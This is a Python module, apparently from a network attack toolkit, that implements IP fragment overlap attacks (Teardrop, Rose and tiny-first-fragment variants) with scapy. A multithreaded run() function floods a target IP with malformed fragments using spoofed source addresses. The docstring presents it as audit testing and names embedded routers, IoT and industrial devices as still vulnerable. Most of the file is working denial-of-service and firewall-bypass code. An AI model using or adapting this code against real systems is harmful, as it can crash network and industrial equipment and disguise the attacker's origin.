"""
modules/overlap.py - OVERLAP
Fragment Overlap Attack (Teardrop variant).

How it works:
  IP fragmentation reassembly relies on fragment offset fields to
  reconstruct the original packet. The overlap attack sends fragments
  where the offset fields are crafted to cause overlapping memory regions
  during reassembly.

  Classic Teardrop (CVE-1999-0015):
    Fragment 1: offset=0,     length=68  (bytes 0-67)
    Fragment 2: offset=24,    length=40  (bytes 24-63)  <- OVERLAPS fragment 1

    Vulnerable kernel reassembly:
      memcpy(buf + 0,  frag1_data, 68)
      memcpy(buf + 24, frag2_data, 40)  <- negative remaining length -> crash

  Modern variants:
    - Overlapping fragments with inconsistent IP lengths
    - Tiny first fragment forcing TCP header split across fragments
    - Rose Attack: many fragments with offset=0 (multiple "first" fragments)
    - Newtear: fragment 2 offset before end of fragment 1 (classic overlap)

  Current impact:
    - Patched in Linux 2.0.32+, Windows NT SP3+
    - STILL EFFECTIVE on:
      * Embedded devices (routers, IoT, industrial)
      * Custom TCP/IP stacks (RTOS: VxWorks, LynxOS, QNX)
      * Network equipment with custom reassembly
      * Some hypervisor virtual NIC implementations

  Testing value in audit:
    - Verify target kernel/firmware has patched reassembly
    - Check /proc/net/snmp: Ip: ReasmFails counter
    - Monitor for kernel panics / unexpected reboots
    - Useful for embedded/IoT targets in OT/ICS scope

  Variants implemented:
    "teardrop"  : Classic overlapping offsets (fragment 2 starts before fragment 1 ends)
    "rose"      : Multiple fragments all with offset=0 (confuses reassembly)
    "tiny"      : 8-byte first fragment (forces TCP header split)
"""

import random
import socket
import struct
import itertools
from floodles.core.packet_builder import random_ip, random_port
from floodles.core.sender import FloodEngine

try:
    from scapy.all import IP, UDP, TCP, Raw, fragment
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


def _build_teardrop(dst_ip: str, spoof: bool) -> list[bytes]:
    """
    Classic Teardrop: fragment 2 overlaps fragment 1.

    Fragment 1: offset=0,  len=68  (covers bytes 0-67)
    Fragment 2: offset=3,  len=48  (covers bytes 24-71, OVERLAPS frag1 bytes 24-67)
    (offset is in 8-byte units: offset=3 -> byte 24)
    """
    src = random_ip() if spoof else None
    ip_id = random.randint(1, 65535)

    # Fragment 1: MF=1, offset=0
    frag1_payload = bytes(random.getrandbits(8) for _ in range(68))
    frag1 = IP(
        src=src, dst=dst_ip,
        id=ip_id,
        flags="MF",   # More Fragments
        frag=0,
        proto=17,     # UDP
    ) / Raw(load=frag1_payload)

    # Fragment 2: MF=0, offset=3 (byte 24) -> overlaps frag1 bytes 24-67
    frag2_payload = bytes(random.getrandbits(8) for _ in range(48))
    frag2 = IP(
        src=src, dst=dst_ip,
        id=ip_id,
        flags=0,      # Last fragment
        frag=3,       # offset=3 -> byte 24 (8*3=24)
        proto=17,
    ) / Raw(load=frag2_payload)

    return [bytes(frag1), bytes(frag2)]


def _build_rose(dst_ip: str, spoof: bool, count: int = 4) -> list[bytes]:
    """
    Rose attack: multiple fragments with offset=0.
    Confuses reassembly state machines that expect only one first fragment.
    """
    src = random_ip() if spoof else None
    ip_id = random.randint(1, 65535)
    frags = []

    for i in range(count):
        payload = bytes(random.getrandbits(8) for _ in range(random.randint(32, 128)))
        frag = IP(
            src=src, dst=dst_ip,
            id=ip_id,
            flags="MF" if i < count - 1 else 0,
            frag=0,   # All claim to be offset=0
            proto=17,
        ) / Raw(load=payload)
        frags.append(bytes(frag))

    return frags


def _build_tiny_first(dst_ip: str, dst_port: int, spoof: bool) -> list[bytes]:
    """
    Tiny first fragment: 8 bytes only (splits TCP header across 2 fragments).
    Some packet filters only inspect first fragment for port info -> bypass.
    """
    src = random_ip() if spoof else None
    ip_id = random.randint(1, 65535)

    # Build complete TCP SYN payload (20 byte header)
    src_port = random_port()
    seq      = random.randint(0, 2**32 - 1)
    tcp_hdr  = struct.pack("!HHIIBBHHH",
        src_port, dst_port, seq, 0,
        0x50,   # data offset=5
        0x02,   # SYN flag
        8192,   # window
        0,      # checksum (0 for now)
        0,      # urgent
    )

    # Fragment 1: first 8 bytes of TCP header only
    frag1 = IP(
        src=src, dst=dst_ip,
        id=ip_id,
        flags="MF",
        frag=0,
        proto=6,  # TCP
    ) / Raw(load=tcp_hdr[:8])

    # Fragment 2: remaining TCP header bytes
    frag2 = IP(
        src=src, dst=dst_ip,
        id=ip_id,
        flags=0,
        frag=1,   # offset=1 -> byte 8
        proto=6,
    ) / Raw(load=tcp_hdr[8:])

    return [bytes(frag1), bytes(frag2)]


def run(
    dst_ip: str,
    dst_port: int = 80,
    variant: str = "teardrop",
    threads: int = 8,
    pps_limit: int = 0,
    duration: int = 30,
    spoof: bool = True,
) -> FloodEngine:
    """
    Launch fragment overlap attack.

    Args:
        dst_ip    : Target IP.
        dst_port  : Target port (tiny variant only).
        variant   : "teardrop" - classic overlapping fragments (crash older kernels)
                    "rose"     - multiple offset=0 fragments (confuse reassembly)
                    "tiny"     - 8-byte first frag (firewall ACL bypass)
        threads   : Worker count.
        pps_limit : PPS cap.
        duration  : Duration in seconds.
        spoof     : Randomize source IP.

    Returns:
        FloodEngine (already started).

    Monitoring:
        Watch /proc/net/snmp on target:
          grep "ReasmFails" /proc/net/snmp
        Increasing ReasmFails = fragments being dropped/failing reassembly.
    """
    if not SCAPY_AVAILABLE:
        raise ImportError("scapy required: pip install scapy")

    def make_packet() -> list[bytes]:
        if variant == "teardrop":
            return _build_teardrop(dst_ip, spoof)
        elif variant == "rose":
            return _build_rose(dst_ip, spoof)
        else:
            return _build_tiny_first(dst_ip, dst_port, spoof)

    engine = FloodEngine(
        packet_fn=make_packet,
        dst_ip=dst_ip,
        threads=threads,
        pps_limit=pps_limit,
        duration=duration,
    )
    engine.start()
    return engine
